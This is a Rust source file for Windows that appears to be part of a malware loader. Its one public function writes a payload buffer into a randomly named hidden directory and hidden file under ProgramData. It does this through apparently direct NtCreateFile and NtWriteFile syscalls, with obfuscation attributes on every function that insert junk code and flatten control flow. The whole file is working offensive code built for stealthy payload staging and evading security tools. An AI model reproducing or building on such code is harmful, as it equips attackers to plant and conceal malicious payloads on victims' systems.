use crate::syscalls::{SYSCALLS, UNICODE_STRING, OBJECT_ATTRIBUTES, IO_STATUS_BLOCK};
use std::ffi::{c_void, OsStr};
use std::os::windows::ffi::OsStrExt;
use std::ptr;
use rand::{Rng, thread_rng};
use winapi::um::winnt::{FILE_ATTRIBUTE_HIDDEN, FILE_ATTRIBUTE_DIRECTORY, GENERIC_WRITE, FILE_SHARE_WRITE, SYNCHRONIZE, FILE_LIST_DIRECTORY};
use winapi::um::fileapi::{FILE_CREATE, FILE_DIRECTORY_FILE, FILE_SYNCHRONOUS_IO_NONALERT};
use obfuscator::obfuscate;
use std::env;

#[obfuscate(garbage = true, control_f = true)]
fn get_programdata_path() -> Result<String, &'static str> {
    match env::var("ProgramData") {
        Ok(path) => Ok(path),
        Err(_) => Err("Failed to get ProgramData environment variable"),
    }
}

#[obfuscate(garbage = true, control_f = true)]
fn generate_random_name(length: usize) -> String {
    const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let mut rng = thread_rng();
    (0..length)
        .map(|_| {
            let idx = rng.gen_range(0..CHARSET.len());
            CHARSET[idx] as char
        })
        .collect()
}

#[obfuscate(garbage = true, control_f = true)]
pub fn save_payload_to_disk(payload: &[u8]) -> Result<(), String> {
    unsafe {
        let program_data_path = get_programdata_path()?;
        let dir_name = generate_random_name(12);
        let file_name = generate_random_name(8);
        let dir_path = format!("{}\\{}", program_data_path, dir_name);
        let file_path = format!("{}\\{}.dat", dir_path, file_name);

        // Create the directory
        let mut dir_handle: *mut c_void = ptr::null_mut();
        let mut io_status_block: IO_STATUS_BLOCK = std::mem::zeroed();
        let nt_dir_path = format!("\\??\\{}", dir_path);
        let mut dir_path_wide: Vec<u16> = OsStr::new(&nt_dir_path).encode_wide().chain(Some(0)).collect();
        let mut unicode_string = UNICODE_STRING {
            Length: ((dir_path_wide.len() - 1) * 2) as u16,
            MaximumLength: (dir_path_wide.len() * 2) as u16,
            Buffer: dir_path_wide.as_mut_ptr(),
        };

        let mut object_attributes = OBJECT_ATTRIBUTES {
            Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            RootDirectory: ptr::null_mut(),
            ObjectName: &mut unicode_string,
            Attributes: 0x40, // OBJ_CASE_INSENSITIVE
            SecurityDescriptor: ptr::null_mut(),
            SecurityQualityOfService: ptr::null_mut(),
        };

        let status = (SYSCALLS.NtCreateFile)(
            &mut dir_handle,
            SYNCHRONIZE | FILE_LIST_DIRECTORY,
            &mut object_attributes,
            &mut io_status_block,
            ptr::null_mut(),
            FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_DIRECTORY,
            FILE_SHARE_WRITE,
            FILE_CREATE,
            FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            ptr::null_mut(),
            0,
        );

        if status != 0 {
            return Err(format!("Failed to create directory with status: {}", status));
        }
        (SYSCALLS.NtClose)(dir_handle);

        // Create and write the file
        let mut file_handle: *mut c_void = ptr::null_mut();
        let nt_file_path = format!("\\??\\{}", file_path);
        let mut file_path_wide: Vec<u16> = OsStr::new(&nt_file_path).encode_wide().chain(Some(0)).collect();
        let mut unicode_file_string = UNICODE_STRING {
            Length: ((file_path_wide.len() - 1) * 2) as u16,
            MaximumLength: (file_path_wide.len() * 2) as u16,
            Buffer: file_path_wide.as_mut_ptr(),
        };

        object_attributes.ObjectName = &mut unicode_file_string;

        let status = (SYSCALLS.NtCreateFile)(
            &mut file_handle,
            GENERIC_WRITE,
            &mut object_attributes,
            &mut io_status_block,
            ptr::null_mut(),
            FILE_ATTRIBUTE_HIDDEN,
            0,
            FILE_CREATE,
            FILE_SYNCHRONOUS_IO_NONALERT,
            ptr::null_mut(),
            0,
        );

        if status != 0 {
            return Err(format!("Failed to create file with status: {}", status));
        }

        let status = (SYSCALLS.NtWriteFile)(
            file_handle,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            &mut io_status_block,
            payload.as_ptr() as *mut c_void,
            payload.len() as u32,
            ptr::null_mut(),
            ptr::null_mut(),
        );

        (SYSCALLS.NtClose)(file_handle);

        if status != 0 {
            return Err(format!("Failed to write to file with status: {}", status));
        }

        Ok(())
    }
}
